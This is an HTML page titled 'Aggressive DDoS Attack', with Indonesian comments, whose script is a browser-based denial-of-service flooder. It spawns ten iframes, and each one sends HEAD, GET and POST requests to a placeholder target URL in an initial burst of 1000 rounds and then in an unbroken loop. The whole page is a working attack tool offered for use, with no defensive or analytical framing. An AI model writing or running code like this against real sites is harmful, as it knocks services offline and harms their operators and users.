<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aggressive DDoS Attack</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #282c34;
            color: white;
            text-align: center;
            padding: 50px;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        input[type="text"], button {
            padding: 10px;
            margin: 5px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="text"] {
            width: 100%;
            max-width: 400px;
        }
        button {
            background: #61dafb;
            color: #282c34;
            transition: background 0.3s;
        }
        button:hover {
            background: #21a1f1;
        }
        #status {
            margin-top: 20px;
            font-size: 1.2em;
            color: red;
        }
        #console {
            margin-top: 20px;
            background: #333;
            padding: 10px;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <script>
        // Fungsi buat tempat iframe
        function createAttackFrame() {
            const iframe = document.createElement('iframe');
            iframe.src = 'about:blank'; // Menggunakan about:blank untuk menghindari permintaan tambahan
            iframe.style.position = 'absolute';
            iframe.style.top = '0';
            iframe.style.left = '0';
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            iframe.style.border = 'none';
            iframe.style.display = 'block'; // Menyembunyikan iframe
            document.body.appendChild(iframe);

            iframe.onload = function() {
                const doc = iframe.contentDocument || iframe.contentWindow.document;
                doc.open();
                doc.write(`
                    <!DOCTYPE html>
                    <html lang="en">
                    <body>
                        <script>
                            function sendRequest(targetURL, method) {
                                const xhr = new XMLHttpRequest();
                                xhr.open(method, targetURL, true);
                                xhr.onreadystatechange = function() {
                                    if (xhr.readyState === 4) {
                                        console.log(\`\${method} \${xhr.status}: \${xhr.responseURL}\`);
                                    }
                                };
                                xhr.send();
                            }

                            function startAttack(targetURL) {
                                function attack() {
                                    ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(targetURL, method));
                                }

                                // Burst awal 1000 permintaan untuk setiap metode
                                for (let i = 0; i < 1000; i++) {
                                    attack();
                                }

                                // Lakukan permintaan secara agresif
                                setInterval(attack, 0);
                            }

                            // Ganti 'https://example.com' dengan URL target
                            startAttack('https://example.com');
                        </script>
                    </body>
                    </html>
                `);
                doc.close();
            };
        }

        // Buat beberapa iframe untuk meningkatkan agresivitas serangan
        for (let i = 0; i < 10; i++) {
            createAttackFrame();
        }
    </script>
</body>
</html>
